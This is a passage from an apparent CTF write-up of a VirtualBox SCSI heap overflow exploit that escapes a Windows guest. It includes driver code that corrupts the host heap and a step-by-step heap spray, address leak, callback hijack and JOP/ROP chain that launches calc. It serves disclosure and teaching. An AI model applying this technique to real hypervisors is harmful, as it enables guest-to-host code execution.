    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; i &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;; i &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;(buf); i &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;)
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;((&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;)(&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;buf[i])) &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; i &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;; i &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;; i&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;)
        __outbytestring(port&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;, buf, &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;(buf))
}

&lt;/pre&gt;
&lt;p&gt;The driver first has to initiate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCSI&lt;/code&gt; state machine with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bufsize&lt;/code&gt;. Then we read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bufsize-1&lt;/code&gt; bytes and then we read 9 bytes. We chose 9 instead of 2 byte in order to have the buffer pointer 8 byte aligned after the overflow. Finally, we overwrite the next 10000kb after our allocated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer+8&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;After loading this driver in the win7 guest, this is what we get: &lt;img src=&quot;https://secret.club/assets/sauercl0ud/VM-aborted.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;As expected, the VM crashes because we corrupted the heap. Now we know that our OOB read/write works and since working with drivers was annoying, we decided to modify the driver one last time to expose the vulnerability to user-space. The driver was modified to accept this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Req&lt;/code&gt; struct via an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; operations&lt;/code&gt; {
    OPERATION_OUTBYTE &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;,
    OPERATION_INBYTE &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;,
    OPERATION_OUTSTR &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;,
    OPERATION_INSTR &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;,
};

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; {
    &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; port;
    &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; operation;
    &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; data_byte_out;
} Req;
&lt;/pre&gt;
&lt;p&gt;This enables us to use the driver as a bridge to communicate with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCSI&lt;/code&gt; device from any user-space program. This makes exploit prototyping a whole lot faster and has the added benefit of removing the need to touch Windows drivers ever again (well, for the rest of this exploit anyway :D).&lt;/p&gt;
&lt;p&gt;The bug gives us a liner heap OOB read/write primitive. Our goal is to get from here to arbitrary code execution so let’s put this bug to use!&lt;/p&gt;

&lt;p&gt;We’re able to dump heap data using our OOB read but we’re still far from code execution. This is a good point to start leaking addresses. The least we’ll require for nice exploitation is a code leak (i.e. leaking the address of any dll in order to get access to gadgets) and a heap address leak to facilitate any post exploitation we might want to do.&lt;/p&gt;
&lt;p&gt;This calls for a heap spray to get some desired objects after our leak object to read their pointers. We’d like the objects we spray to tick the following boxes:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Contains a pointer into a dll&lt;/li&gt;
&lt;li&gt;Contains a heap address&lt;/li&gt;
&lt;li&gt;(Contains some kind of function pointer which might get useful later on)&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;After going through some options, we eventually opted for an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HGCMMsgCall&lt;/code&gt; spray. Here’s it’s (stripped down) structure. It’s pretty big so I removed any parts that we don’t care about:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HGCMMsgCall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; HGCMMsgHeader&lt;/code&gt;
{
    &lt;span class=&quot;c1&quot;&gt;// A list of parameters including a &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// char[] with controlled contents&lt;/span&gt;
    VBOXHGCMSVCPARM &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;paParms;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
};

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HGCMMsgHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; HGCMMsgCore
{
    &lt;span class=&quot;nl&quot;&gt;public:&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* Port to be informed on message completion. */&lt;/span&gt;
        PPDMIHGCMPORT pHGCMPort;
};

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PDMIHGCMPORT&lt;/span&gt;
{
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/**
     * Checks if @a pCmd was cancelled.
     *
     * @returns true if cancelled, false if not.
     * @param   pInterface          Pointer to this interface.
     * @param   pCmd                The command we're checking on.
     */&lt;/span&gt;
    DECLR3CALLBACKMEMBER(&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;, pfnIsCmdCancelled,(PPDMIHGCMPORT pInterface, PVBOXHGCMCMD pCmd));
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

} PDMIHGCMPORT;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HGCMMsgCore&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; HGCMReferencedObject
{
    &lt;span class=&quot;nl&quot;&gt;private:&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/** Next element in a message queue. */&lt;/span&gt;
        HGCMMsgCore &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;m_pNext;
        &lt;span class=&quot;cm&quot;&gt;/** Previous element in a message queue.
         *  @todo seems not necessary. */&lt;/span&gt;
        HGCMMsgCore &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;m_pPrev;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
};
&lt;/pre&gt;
&lt;p&gt;It contains a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VTable&lt;/code&gt; pointer, two heap pointers (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m_pNext&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m_pPrev&lt;/code&gt;) because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HGCMMsgCall&lt;/code&gt; objects are managed in a doubly linked list and it has a callback function pointer in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m_pfnCallback&lt;/code&gt; so &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HGCMMsgCall&lt;/code&gt; definitely fits the bill for a good spray target. Another nice thing is that we’re able to call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pHGCMPort-&amp;gt;pfnIsCmdCancelled&lt;/code&gt; pointer at any point we like. This works because this pointer gets invoked on all the already allocated messages, whenever a new message is created. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HGCMMsgCall&lt;/code&gt;’s size is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x70&lt;/code&gt;, so we’ll have to initiate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCSI&lt;/code&gt; state machine with the same size to ensure our buffer gets allocated in the same heap region as our sprayed objects.&lt;/p&gt;
&lt;p&gt;Conveniently enough, &lt;a href=&quot;https://twitter.com/_niklasb&quot;&gt;niklasb&lt;/a&gt; has already prepared &lt;a href=&quot;https://github.com/niklasb/sploits/blob/master/virtualbox/hgcm-oob/source/pwn2ownuser/main.cpp#L287&quot;&gt;a function&lt;/a&gt; we can borrow to spray &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HGCMMsgCall&lt;/code&gt; objects.&lt;/p&gt;
&lt;p&gt;Calling niklas’ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wait_prop&lt;/code&gt; function will allocate a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HGCMMsgCall&lt;/code&gt; object with a controlled &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pszPatterns&lt;/code&gt; field. This char array is very useful because it is referenced by the sprayed objects and can be easily identified on the heap.&lt;/p&gt;
&lt;p&gt;Spraying on a &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/memory/low-fragmentation-heap&quot;&gt;Low-fragmentation Heap&lt;/a&gt; can be a little tricky but after some trial and error we got to the following spray strategy:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;We iterate 64 times&lt;/li&gt;
&lt;li&gt;Each time we create a client and spray 16 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HGCMMsgCall&lt;/code&gt;s&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;That way, we seemed to reliably get a bunch of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HGCMMsgCall&lt;/code&gt;s ahead of our leak object which allows us to read and write their fields.&lt;/p&gt;
&lt;p&gt;First things first: getting the code leak is simple enough. All we have to do is to read heap memory until we find something that matches the structure of one of our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HGCMMsgCall&lt;/code&gt; and read the first quad-word of said object. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VTable&lt;/code&gt; points into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VBoxC.dll&lt;/code&gt; so we can use this leak to calculate the base address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VBoxC.dll&lt;/code&gt; for future use.&lt;/p&gt;
&lt;p&gt;Getting the heap leak is not as straight forward. We can easily read the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m_pNext&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m_pPrev&lt;/code&gt; fields to get a pointer to some other &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HGCMMsgCall&lt;/code&gt; object but we don’t have any clue about where that object is located relatively to our current buffer position. So reading &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m_pNext&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m_pPrev&lt;/code&gt; of &lt;strong&gt;one&lt;/strong&gt; object is useless… But what if we did the same for a second object? Maybe you can already see where this is going. Since these objects are organized in a doubly linked list, we can abuse some of their properties to match an object &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; to it’s next neighbor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;B&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This works because of this property:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;addr(B) - addr(A) == A-&amp;gt;m_pNext - B-&amp;gt;m_pPrev
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;To get the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;B&lt;/code&gt;, we have to do the following:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Read object &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; and save the pointers&lt;/li&gt;
&lt;li&gt;Take note of how many bytes we had to read until we found the next object &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;B&lt;/code&gt; in a variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Read object &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;B&lt;/code&gt; and save the pointers&lt;/li&gt;
&lt;li&gt;If &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A-&amp;gt;m_pNext - B-&amp;gt;m_pPrev == x&lt;/code&gt; we most likely found the right neighbor and know that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;B&lt;/code&gt; is at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A-&amp;gt;m_pNext&lt;/code&gt;. If not, we just keep reading objects&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;This is pretty fast and works somewhat reliably. Equipped with our heap address and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VBoxC.dll&lt;/code&gt; base address leak, we can move on to hijacking the execution flow.&lt;/p&gt;

&lt;p&gt;Remember those &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pfnIsCmdCancelled&lt;/code&gt; callbacks? Those will make for a very short “Getting RIP control” section… :P&lt;/p&gt;
&lt;p&gt;There’s really not that much to this part of the exploit. We only have to read heap data until we find another one of our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HGCMMsgCall&lt;/code&gt;s and overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m_pfnCallback&lt;/code&gt;. As soon as a new message gets allocated, this method is called on our corrupted object with a malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pHgcmPort-&amp;gt;pfnIsCmdCancelled&lt;/code&gt; field.&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**
 * @interface_method_impl{VBOXHGCMSVCHELPERS,pfnIsCallCancelled}
 */&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/* static */&lt;/span&gt; DECLCALLBACK&lt;/code&gt;(&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;) HGCMService&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;svcHlpIsCallCancelled(VBOXHGCMCALLHANDLE callHandle)
{
    HGCMMsgHeader &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;pMsgHdr &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; (HGCMMsgHeader &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;)callHandle;
    AssertPtrReturn(pMsgHdr, &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;);

    PVBOXHGCMCMD pCmd &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; pMsgHdr&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;pCmd;
    AssertPtrReturn(pCmd, &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;);

    PPDMIHGCMPORT pHgcmPort &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; pMsgHdr&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;pHGCMPort;   &lt;span class=&quot;c1&quot;&gt;// We corrupted pHGCMPort&lt;/span&gt;
    AssertPtrReturn(pHgcmPort, &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;);

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; pHgcmPort&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;pfnIsCmdCancelled(pHgcmPort, pCmd);   &lt;span class=&quot;c1&quot;&gt;// --- Profit ---&lt;/span&gt;
}
&lt;/pre&gt;
&lt;p&gt;Internally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svcHlpIsCallCancelled&lt;/code&gt; will load &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pHgcmPort&lt;/code&gt; into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r8&lt;/code&gt; and execute a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jmp [r8+0x10]&lt;/code&gt; instruction. Here’s what happens if we corrupt &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m_pfnCallback&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0000000041414141&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://secret.club/assets/sauercl0ud/RIP-control.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;At this point, we are able to redirect code execution to anywhere we want. But where do we want to redirect it to? Oftentimes getting RIP control is already enough to solve CTF pwnables. Glibc has these &lt;a href=&quot;https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;one-gadgets&lt;/code&gt;&lt;/a&gt; which are basically addresses you jump to, that will instantly give you a shell. But sadly there is no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;leak-kernel32dll-set-rcx-to-calc-and-call-WinExec&lt;/code&gt; one-gadget in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VBoxC.dll&lt;/code&gt; which means we’ll have to get a little creative once more. ROP is not an option because we don’t have stack control so the only thing left is JOP(&lt;a href=&quot;https://developer.arm.com/architectures/learn-the-architecture/providing-protection-for-complex-software/jump-oriented-programming&quot;&gt;Jump-Oriented-Programming&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;JOP requires some kind of register control, but at the point at which our callback is invoked we only control a single register, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r8&lt;/code&gt;. An additional constraint is that since we only leaked a pointer from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VBoxC.dll&lt;/code&gt; we’re limited to JOP gadgets within that library. Our goal for this JOP chain is to perform a stack pivot into some memory on the heap where we will place a ROP chain that will do the heavy lifting and eventually pop a calc.&lt;/p&gt;
&lt;p&gt;Sounds easy enough, let’s see what we can come up with :P&lt;/p&gt;
&lt;p&gt;Our first issue is that we need to find some memory area where we can put the JOP data. Since our OOB write only allows us to write to the heap, that’ll have to do. But we can’t just go around writing stuff to the heap because that will most likely corrupt some heap metadata, or newly allocated objects will corrupt us. So we need to get a buffer allocated first and write to that. We can abuse the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pszPatterns&lt;/code&gt; field in out spray for that. If we extend the pattern size to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x70&lt;/code&gt; bytes and place a known magic value in the first quad-word, we can use the OOB read to find that magic on the heap and overwrite the remaining &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x68&lt;/code&gt; bytes with our payload. We’re the ones who allocated that string so it won’t get free’d randomly so long as we hold a reference to it and since we already leaked a heap address, we’re also able to calculate the address of our string and can use it in the JOP chain.&lt;/p&gt;
&lt;p&gt;After spending ~30min straight reading through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VBoxC.dll&lt;/code&gt; assembly together with &lt;a href=&quot;https://twitter.com/_localo_&quot;&gt;localo&lt;/a&gt;, we finally came up with a way to get from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r8&lt;/code&gt; control to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; control. I had trouble figuring out a way to describe the JOP chain, so &lt;a href=&quot;https://localo.ooo/&quot;&gt;css wizard&lt;/a&gt; localo created an interactive visualization in order to make following the chain easier. To simplify things even further, the visualization will show all registers with uncontrolled contents as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XXX&lt;/code&gt; and any reading or uncontrolled writing operations to or from those registers will be ignored.&lt;/p&gt;
&lt;p&gt;Let’s assume the JOP payload in our string is located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1230&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r8&lt;/code&gt; points to it. We trigger the callback, which will execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jmp [r8+0x10]&lt;/code&gt;. You can click through the slides to understand what happens:&lt;/p&gt;

&lt;p&gt;We managed to get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; to point into our string and the next &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; will kickstart ROP execution. From this point on, it’s just a matter of crafting a textbook &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinExec(&quot;calc\x00&quot;)&lt;/code&gt; ROP-chain. But for the sake of completeness I’ll mention the gist of it. First, we read the address of a symbol from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VBoxC.dll&lt;/code&gt;’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IAT&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IAT&lt;/code&gt; is comparable to a global offset table on linux and contains pointers to dynamically linked library symbols. We’ll use this to leak a pointer into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kernel32.dll&lt;/code&gt;. Then we can calculate the runtime address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinExec()&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kernel32.dll&lt;/code&gt;, set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcx&lt;/code&gt; to point to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;calc\x00&quot;&lt;/code&gt; and call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinExec&lt;/code&gt; which will pop a calculator.&lt;/p&gt;
&lt;p&gt;However there is a little twist to this. A keen eye might have noticed that we set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10000000&lt;/code&gt; and that we are using a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;leave; jmp rax&lt;/code&gt; gadget to get to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinExec&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rop_gadget_5&lt;/code&gt; instead of just a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jmp rax&lt;/code&gt;. That is because we were experiencing some major issues with stack alignment and stack frame size when directly calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinExec&lt;/code&gt; with the stack pointer still pointing into our heap payload. It turns out, that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinExec&lt;/code&gt; sets up a rather large stack frame and the distance between out fake stack and the start of the heap isn’t always large enough to contain it. Therefore we were getting paging issues. Luckily, &lt;a href=&quot;https://twitter.com/0x4d5aC&quot;&gt;0x4d5a&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/_localo_&quot;&gt;localo&lt;/a&gt; knew from reading &lt;a href=&quot;https://starlabs.sg/blog/2020/04/adventures-in-hypervisor-oracle-virtualbox-research/&quot;&gt;this blog post&lt;/a&gt; about the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vram&lt;/code&gt; section which has weak randomisation and it turns out that the range from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xcb10000&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x13220000&lt;/code&gt; is always mapped by that section. So if we set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10000000&lt;/code&gt; and call a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;leave; jmp rax&lt;/code&gt; it will set the stack pointer to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10000000&lt;/code&gt; before calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinExec&lt;/code&gt; and thereby giving it enough space to do all the stack setup it likes ;)&lt;/p&gt;

&lt;p&gt;‘nuff said! Here’s the demo:&lt;/p&gt;
&lt;iframe width=&quot;420&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/mjKxafMbpS0&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;[embedded content]&lt;/iframe&gt;
&lt;p&gt;You can find this version of our exploit &lt;a href=&quot;https://github.com/Sauercloud/RWCTF21-VirtualBox-61-escape&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Writing this exploit was a joint effort of a bunch of people.&lt;/p&gt;
&lt;ul readability=&quot;0.81333333333333&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;ESPR’s &lt;a href=&quot;https://twitter.com/__spq__&quot;&gt;spq&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/_tsuro&quot;&gt;tsuro&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/fktio&quot;&gt;malle&lt;/a&gt; who don’t need an introduction :D&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;My ALLES! teammates and Windows experts Alain Rödel aka &lt;a href=&quot;https://twitter.com/0x4d5aC&quot;&gt;0x4d5a&lt;/a&gt; and Felipe Custodio Romero aka &lt;a href=&quot;https://twitter.com/_localo_&quot;&gt;localo&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-0.70175438596491&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://twitter.com/_niklasb&quot;&gt;niklasb&lt;/a&gt; for his &lt;a href=&quot;https://github.com/niklasb/sploits/tree/master/virtualbox/hgcm-oob/&quot;&gt;prior work&lt;/a&gt; and for some helpful pointers!&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;“A ROP chain a day keeps the doctor away. Immer dran denken, hat mein Opa immer gesagt.”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;~ &lt;em&gt;Niklas Baumstark (2021)&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;myself, Ilias Morad aka &lt;a href=&quot;https://twitter.com/A2nkF_&quot;&gt;A2nkF&lt;/a&gt; :)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;I had the pleasure of working with this group of talented people over the course of multiple sleepless nights and days during and even after the CTF was already over just to get the exploit working properly on a release build of VirtualBox and to improve stability. This truly shows what a small group of dedicated people is able to achieve in an incredibly short period of time if they put their minds to it! I’d like to thank every single one of you :D&lt;/p&gt;

&lt;p&gt;This was my first time working with VirtualBox so it was a very educational and fun exercise. We managed to write a working exploit for a debug build of virtual box with 3h left in the CTF but sadly, we weren’t able to port it to a release build in time for the CTF due to anti-debugging in VirtualBox which made figuring out what exactly was breaking very hard. The next day we rebuilt VirtualBox without the anti-debugging/process hardening and finally properly ported the exploit to work with the latest release build of VirtualBox. We recommend you disable SCSI on your VirtualBox until this bug is patched.&lt;/p&gt;
&lt;p&gt;The Organizers even agreed to demo our exploit in a live stream on their &lt;a href=&quot;https://www.twitch.tv/realworldctf&quot;&gt;twitch channel&lt;/a&gt; afterwards and after some offset issues we finally got everything working!&lt;/p&gt;
